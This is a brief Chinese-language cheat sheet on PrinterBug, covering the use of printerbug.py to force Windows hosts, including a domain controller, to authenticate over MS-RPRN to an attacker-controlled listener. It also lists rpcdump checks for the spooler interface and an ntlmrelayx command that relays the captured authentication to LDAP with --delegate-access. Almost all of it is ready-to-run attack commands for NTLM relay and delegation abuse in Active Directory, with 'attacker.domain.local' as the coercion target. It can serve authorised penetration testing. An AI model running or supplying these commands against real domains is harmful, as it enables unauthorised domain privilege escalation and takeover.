# PrinterBug 使用

PrinterBug 用于验证 MS-RPRN 强制认证路径，常用于中继前置检查。

## 常用命令

```bash
python3 printerbug.py domain.local/user:pass@192.168.1.10 192.168.1.50
```

```bash
python3 printerbug.py domain.local/user:pass@dc01.domain.local attacker.domain.local
```

```bash
rpcdump.py @192.168.1.10 | findstr MS-RPRN
```

```bash
rpcdump.py ncacn_ip_tcp:192.168.1.10
```

```bash
ntlmrelayx.py -t ldap://dc01.domain.local --delegate-access
```

测试时要同时看监听端是否收到认证，并记录目标服务是否启用 spooler。
